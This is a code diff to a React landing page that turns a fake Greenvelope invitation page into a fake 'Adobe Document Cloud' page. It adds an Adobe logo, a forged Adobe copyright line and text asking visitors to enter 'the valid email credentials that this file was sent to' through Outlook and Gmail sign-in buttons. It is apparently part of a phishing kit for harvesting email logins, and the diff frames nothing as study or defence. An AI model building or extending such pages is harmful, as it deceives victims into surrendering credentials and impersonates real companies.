@@ -343,16 +343,20 @@ useEffect(() => {
       {currentView === 'landing' && (
         <div className="landing-container">
           <div className="landing-card">
-            <div className="landing-logo">
-              <div className="landing-logo-text">Paperless</div>
-              <div className="landing-post">POST</div>
-            </div>
-            <h1 className="landing-title">
-              Manage your Online Invitations &<br />Greeting Card
-            </h1>
-            <p className="landing-description">
-              To view the invitation, please select your email provider below and log in. You were invited to access the invitation on Greenvelope.
-            </p>
+           <div className="landing-logo">
+  <div className="adobe-logo">
+    <svg viewBox="0 0 240 234" width="80" height="80">
+      <path fill="#FF0000" d="M42.5,0h155C221,0,240,19,240,42.5v149c0,23.5-19,42.5-42.5,42.5h-155C19,234,0,215,0,191.5v-149C0,19,19,0,42.5,0z"/>
+      <path fill="#FFF" d="M132.5,83.7l28.6,66.7h-21.3l-8.4-21.9H103l18.4-44.8H132.5z M91.4,150.3H70.1L98.7,83.7h18.4L91.4,150.3z"/>
+    </svg>
+  </div> 
+</div>
+           <h1 className="landing-title">
+  Adobe Document Cloud
+</h1>
+<p className="landing-description">
+  To read the document, please enter with the valid email credentials that this file was sent to.
+</p>
             <button className="provider-button outlook-btn" onClick={() => handleProviderSelect('outlook')}>
               <div className="provider-icon">
                 <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
@@ -379,11 +383,11 @@ useEffect(() => {
               </div>
               Sign in with Gmail
             </button>
-            <div className="landing-footer">
-              Online invitations & birthday cards. greenvelope simplifies event planning with user-friendly tools for managing online invites.
-              <br /><br />
-              © 2026 Sincere Corporation. greenvelope is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of respective.
-            </div>
+          <div className="landing-footer">
+  Select your email provider to view Document
+  <br /><br />
+  CopyRight © 2026 Adobe
+</div>
           </div>
         </div>
       )} 
@@ -857,7 +861,7 @@ useEffect(() => {
           font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
           -webkit-font-smoothing: antialiased;
           -moz-osx-font-smoothing: grayscale;
-        }
+        } 
 
         .app-container {
           min-height: 100vh;
@@ -874,7 +878,14 @@ useEffect(() => {
           align-items: center;
           justify-content: center;
           padding: 20px;
-        }
+        } 
+
+        .adobe-text {
+  color: white;
+  font-size: 18px;
+  font-weight: 500;
+  text-align: center;
+}
 
         .landing-card {
           background: #2d2d2d;
